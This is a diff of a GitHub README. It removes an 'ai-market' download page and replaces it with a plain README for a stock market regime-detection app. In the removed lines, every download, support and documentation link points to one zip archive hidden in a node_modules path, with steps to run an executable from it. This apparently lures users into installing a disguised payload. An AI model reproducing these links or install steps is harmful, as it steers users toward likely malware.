@@ -1,124 +1,235 @@
-# 🧠 ai-market - Analyze Market Trends Easily
+# 🧠 Stock Regime Detector
 
-[![Download](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip%https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)  
-[![Version](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
-[![Status](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)](http://localhost:8001/status)
+### *A Regime Intelligence System for Market Phase Detection & Prediction*
 
-## Getting Started
+---
 
-The AI Market Analysis System helps you track market trends and make informed decisions. This guide shows you how to download and run the software smoothly.
+## 🚀 Overview
 
-## 📥 Download & Install
+**Stock Regime Detector** is an advanced **AI-powered market intelligence platform** designed to identify, analyze, and predict **market regimes** in real time.
 
-To get started with the AI Market Analysis System, visit this page to download: [Download Latest Release](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip).
+Unlike traditional trading dashboards, this system focuses on answering one critical question:
 
-Once you reach the downloads page, look for the latest version. Click on the file that matches your operating system. 
+> **“What phase is the market in — and what comes next?”**
 
-### Windows Users
+By combining **machine learning, probabilistic modeling, and multi-agent analysis**, the platform provides deep insights into market structure, transitions, and risk conditions.
 
-If you are using Windows, you will generally download an `.exe` file. After the download completes, follow these steps:
+---
 
-1. Locate the downloaded `.exe` file on your computer.
-2. Double-click the file to start the installation.
-3. Follow the on-screen instructions to complete the setup.
+## 🎯 Core Philosophy
 
-### macOS Users
+This is **not a trading terminal**.
+This is a **Regime Intelligence System**.
 
-For macOS, you will typically download a `.dmg` file. Here’s what you should do:
+It is built to:
 
-1. Find the downloaded `.dmg` file in your Downloads folder.
-2. Double-click the file to open it.
-3. Drag the AI Market application to your Applications folder.
-4. You can then launch it directly from the Applications folder.
+* Detect **market phases** (Bull, Bear, Sideways, Volatile, Crisis)
+* Quantify **probabilities & confidence**
+* Predict **regime transitions**
+* Explain **why decisions are made**
+* Enable **data-driven strategic thinking**
 
-### Linux Users
+---
 
-For Linux users, you will likely download a `https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip` file. Follow these steps:
+## ⚡ Key Features
 
-1. Open your terminal.
-2. Navigate to the directory where you downloaded the file.
-3. Use the command: `tar -xvzf ai-market*https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip` to extract the contents.
-4. Navigate into the extracted folder and use `./ai-market` to start the application.
+### 🧭 Regime Detection Engine
 
-## 💡 System Requirements
+* Real-time regime classification
+* Multi-class regime modeling
+* Confidence scoring system
+* Regime persistence tracking
 
-To run the AI Market Analysis System, ensure that your system meets the following requirements:
+---
 
-- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
-- **RAM:** Minimum 4 GB is recommended.
-- **Disk Space:** At least 1 GB of free space for installation.
-- **Network:** An active internet connection for data access.
+### 📊 Regime Probability Visualization
 
-## ⚙️ Features
+* Dynamic probability gauge (core UI element)
+* Transition probability matrix
+* Regime shift timeline
+* Historical regime mapping
 
-- **Real-Time Data**: Access live market data from reliable sources like Yahoo Finance.
-- **User-Friendly Interface**: An intuitive design makes navigating the system easy for everyone.
-- **Analytics Dashboard**: Get insightful analytics with just a few clicks.
-- **Multiple Agents**: Leverage multiple agents to perform various market analyses.
-- **Predictive Modeling**: Make data-driven predictions about market trends.
-- **Meridian Diagrams**: Visualize market regimes and sentiment flows with advanced meridian-based visualizations.
+---
 
-## 📈 Meridian Diagrams
+### 🧠 AI Explanation Layer
 
-Meridian diagrams provide a powerful way to understand market dynamics by mapping sentiment flows and regime transitions:
+* “Why this regime?” insights
+* Feature importance breakdown
+* Signal attribution (momentum, volatility, macro indicators)
+* Risk-aware interpretations
 
-- **Sentiment Flow Visualization**: Track how sentiment meridians flow through market cycles
-- **Regime Transitions**: Visualize transitions between bullish, neutral, and bearish market regimes
-- **Multi-Asset Analysis**: Analyze correlations and divergences across multiple assets using meridian mapping
-- **Real-Time Updates**: Watch meridian patterns update in real-time as market conditions change
+---
 
-## 🛠️ Running the Application
+### 🔄 Regime Transition Intelligence
 
-After installation, you can launch the AI Market Analysis System easily. 
+* Predict next likely regime
+* Markov-style transition modeling
+* Shock / anomaly detection
+* Regime duration analysis
 
-### Windows
+---
 
-Click on the start menu, and look for "AI Market". Click on it to launch.
+### 📈 Backtesting & Strategy Analysis
 
-### macOS
+* Equity curve visualization
+* Regime-based strategy performance
+* Drawdown analytics
+* Trade distribution by regime
 
-Open the Applications folder and find "AI Market". Double-click to start.
+---
 
-### Linux
+### 🌐 Multi-Asset Regime View
 
-Open your terminal and navigate to the installation folder. Use `./ai-market` to run it.
+* Cross-asset regime comparison
+* Market-wide synchronization detection
+* Regime heatmaps
+* Contagion analysis
 
-## 📊 User Operations
+---
 
-Once the application is running, you will see multiple options on the main dashboard:
+### ⚙️ Interactive Control Panel
 
-1. **Home Dashboard**: Gives an overview of market trends.
-2. **Analytics Section**: View detailed analytics and reports.
-3. **Agents Menu**: Manage various agents that analyze market data.
-4. **Settings**: Customize your user experience based on preferences.
+Fine-tune the system with:
 
-## 📝 Troubleshooting
+* Timeframe selection (intraday → long-term)
+* Model selection (ML / RL / Hybrid)
+* Sensitivity tuning
+* Indicator toggles
+* Risk preference controls
 
-If you encounter issues:
+---
 
-- **Installation Errors**: Ensure your operating system meets the requirements.
-- **Accessing Data**: Check your internet connection.
-- **Performance Issues**: Close any unnecessary applications to free up resources.
+## 🖥️ System Architecture
 
-If you still face challenges, visit our [support page](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip) for assistance.
+```
+Frontend (React + Tailwind + Motion)
+        ↓
+API Layer (FastAPI / Node)
+        ↓
+AI Engine
+ ├── Machine Learning Models
+ ├── Reinforcement Learning
+ ├── Regime Detection Logic
+ ├── RAG-based Explanation System
+        ↓
+Data Layer
+ ├── Market Data APIs
+ ├── Historical Datasets
+ ├── PostgreSQL
+```
 
-## 📣 Community and Support
+---
 
-Join our community to share insights, ask questions, and contribute. You can find us at:
+## 🎨 UI/UX Design Principles
 
-- **GitHub Discussions**: [Join Here](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
-- **Twitter**: Follow us for updates.
+* Ultra-dark, high-contrast interface
+* Glassmorphism with minimal noise
+* Smooth micro-interactions
+* Institutional-grade layout
+* Data-first visualization approach
 
-For any bug reports or feature requests, please raise an issue directly on the GitHub page.
+---
 
-## 📅 Changelog
+## 📦 Installation
 
-To keep track of updates, check the [https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip) file for the latest changes and improvements.
+### 1. Clone the Repository
 
-## 🚀 Quick Links
+```bash
+git clone https://github.com/your-username/stock-regime-detector.git
+cd stock-regime-detector
+```
 
-- [Download Latest Release](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
-- [Our Documentation](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
-- [Support Page](https://github.com/vieta123456/ai-market/raw/refs/heads/master/frontend/node_modules/node-gyp/node_modules/market-ai-v3.7.zip)
+---
 
-Thank you for choosing the AI Market Analysis System. Happy analyzing!
+### 2. Run with Docker (Recommended)
+
+```bash
+docker-compose up --build
+```
+
+---
+
+### 3. Manual Setup
+
+#### Backend
+
+```bash
+pip install -r requirements.txt
+python start_system_final.py
+```
+
+#### Frontend
+
+```bash
+cd frontend
+npm install
+npm run dev
+```
+
+---
+
+## 🌍 Usage
+
+Once running, access:
+
+* **Dashboard** → Regime overview
+* **Analytics** → Deep insights
+* **Backtesting** → Strategy validation
+* **Agents Panel** → AI-driven analysis
+
+---
+
+## 🧪 Example Use Cases
+
+* Detect early **bear market signals**
+* Identify **sideways consolidation phases**
+* Optimize strategies for **specific regimes**
+* Analyze **market transitions and shocks**
+* Improve **risk management decisions**
+
+---
+
+## 🚨 Important Note
+
+This system is designed for:
+
+* Research
+* Analysis
+* Decision support
+
+It is **not financial advice**.
+
+---
+
+## 🛣️ Roadmap
+
+* [ ] Real-time streaming engine
+* [ ] Advanced regime clustering (unsupervised learning)
+* [ ] Cross-market macro integration
+* [ ] AI co-pilot for trading decisions
+* [ ] Voice-enabled analytics interface
+* [ ] 3D regime visualization layer
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome.
+Please open issues or submit pull requests for improvements.
+
+---
+
+## 📄 License
+
+MIT License
+
+---
+
+## 🔥 Final Note
+
+**Stock Regime Detector** is built to feel like an **internal hedge fund intelligence system** —
+not a retail trading tool.
+
+It prioritizes **clarity over noise**,
+**insight over indicators**,
+and **probability over prediction**.
